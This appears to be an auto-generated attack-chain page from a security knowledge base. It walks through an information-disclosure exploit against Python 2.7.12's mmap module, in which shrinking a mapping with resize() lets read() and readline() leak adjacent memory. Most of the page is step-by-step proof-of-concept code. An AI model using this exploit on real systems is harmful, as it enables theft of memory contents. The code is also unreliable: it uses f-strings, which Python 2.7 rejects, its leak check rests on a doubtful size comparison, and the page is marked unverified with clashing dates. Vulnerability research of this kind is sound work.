---
tags:
  - information-disclosure
  - memory-leak
  - python
  - mmap
type: attack_chain
tools:
  - '[[tools/mmap-test-py]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
platforms:
  - Windows
  - Linux
complexity: medium
procedures:
  - '[[procedures/Map-File-Using-Python-mmap-Module]]'
  - '[[procedures/Shrink-Mapped-File-with-resize-to-Break-Invariants]]'
  - '[[procedures/Exploit-Boundary-Violation-with-read-or-readline]]'
  - '[[procedures/Observe-Leaked-Memory-Data-or-Segfault]]'
step_count: 4
techniques:
  - '[[Python]]'
  - '[[Data from Local System]]'
description: >-
  Exploit a vulnerability in Python 2.7.12's mmap module where resize() ignores
  the pos variable, allowing boundary checks to fail and leak data from adjacent
  memory pages using a demonstration script.
skill_level: advanced
impact_level: high
id: 64599d25-c579-4fe0-b6e7-51d745961f00
created_at: '2025-12-14T17:25:13.169Z'
updated_at: '2025-12-14T17:25:13.169Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Python]]'
  - '[[Data from Local System]]'
---
# Information Disclosure via Python mmap Module Resize Boundary Bypass

Multi-stage attack chain demonstrating exploitation of an information disclosure vulnerability in Python 2.7.12's mmap module. The attack involves mapping a file, shrinking it to break internal invariants, reading beyond bounds to access adjacent memory, and observing the leaked data. This was discovered in a security audit and demonstrated on Windows 7, with adaptations possible for Linux, leading to potential leaks of sensitive memory contents or segfaults.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~1 minutes |
| Skill Level | Advanced |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Map File with mmap] --> B[Shrink with resize()] --> C[Exploit read() or readline()] --> D[Observe Leak or Segfault]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/mmap-test-py]]

### Target Environment

- Python 2.7.12 installed
- Windows 7 or Linux OS
- Local file system access for mapping files
- No specific services or ports required

### Initial Access Requirements

- Local execution privileges to run Python scripts
- No network access needed
- Prior installation of Python 2.7.12

## Detailed Attack Procedures

### Step 1: Map a File Using mmap
procedure: [[procedures/Map-File-Using-Python-mmap-Module]]

**Objective**: Establish an initial memory-mapped file object with defined pos and size boundaries to set up the exploitation context.

**Instructions**: Create and open a test file, then map it using the mmap module to initialize the object.

```python
import mmap
import os

# Create a test file
with open('testfile', 'wb') as f:
    f.write(b'A' * 1024)

# Map the file
with open('testfile', 'r+b') as f:
    mm = mmap.mmap(f.fileno(), 0)
    print(f"Initial pos: {mm.tell()}, size: {mm.size()}")
```

**Expected Output**: Mmap object created successfully, with pos at 0 and size reflecting the file length (e.g., 1024 bytes).

**Success Indicators**:
- Mmap object instantiated without errors
- Initial pos and size values logged correctly

### Step 2: Shrink Mapped File with resize() to Break Invariants
procedure: [[procedures/Shrink-Mapped-File-with-resize-to-Break-Invariants]]

**Objective**: Invoke resize() to reduce the mapped size while leaving pos unchanged, resulting in pos > size and violating module invariants.

**Instructions**: After mapping, seek to a position near the end and resize to a smaller value.

```python
# Seek to a position (e.g., near end)
mm.seek(800)

# Resize to smaller size
mm.resize(500)

print(f"After resize - pos: {mm.tell()}, size: {mm.size()}")
```

**Expected Output**: Size updated to 500, but pos remains at 800 (pos > size), breaking invariants without immediate error.

**Success Indicators**:
- Resize completes without exception
- Pos exceeds new size, confirming invariant break

### Step 3: Exploit Boundary Violation with read() or readline()
procedure: [[procedures/Exploit-Boundary-Violation-with-read-or-readline]]

**Objective**: Use read() or readline() to bypass boundary checks and access data from adjacent memory pages due to the invalid state.

**Instructions**: Attempt to read from the invalid mmap object; for read(), the assert fails to catch the issue, leading to a large read length; for readline(), unchecked length causes memchr() to scan far.

```python
# Attempt read() - n becomes PY_SSIZE_T_MAX due to negative calculation
leaked_data = mm.read(100)  # Intended small read, but reads beyond
print(repr(leaked_data))

# Or readline() - passes large size_t to memchr()
line = mm.readline()
print(repr(line))
```

**Expected Output**: Data read includes contents beyond the mapped region, potentially from adjacent pages (e.g., binary garbage or sensitive info).

**Success Indicators**:
- Read operation returns more data than expected size
- Leaked data includes non-file contents (e.g., memory patterns)

### Step 4: Observe Leaked Data or Segfault
procedure: [[procedures/Observe-Leaked-Memory-Data-or-Segfault]]

**Objective**: Capture the leaked memory contents if adjacent pages are readable, or note segfault if access is invalid.

**Instructions**: Inspect the output from the read operation and monitor for crashes.

```python
# After read, analyze output
if len(leaked_data) > mm.size():
    print("Leak detected: Extra data from adjacent memory")
    print(repr(leaked_data[mm.size():]))
else:
    print("Possible segfault or no leak")
```

**Expected Output**: Printed leaked data from adjacent pages if readable; otherwise, Python segfault or access violation error.

**Success Indicators**:
- Extra data printed beyond original file contents
- Confirmation of memory leak via non-deterministic binary data

## Attack Chain Summary

### Key Achievements

1. Successful invariant break in mmap module via resize()
2. Boundary bypass in read() and readline() functions
3. Demonstration of information disclosure from adjacent memory
4. Potential for extracting sensitive data in memory

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Python]]
- [[Data from Local System]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Collection]]

---
*Last updated: 2023-12-14T11:26:17Z*
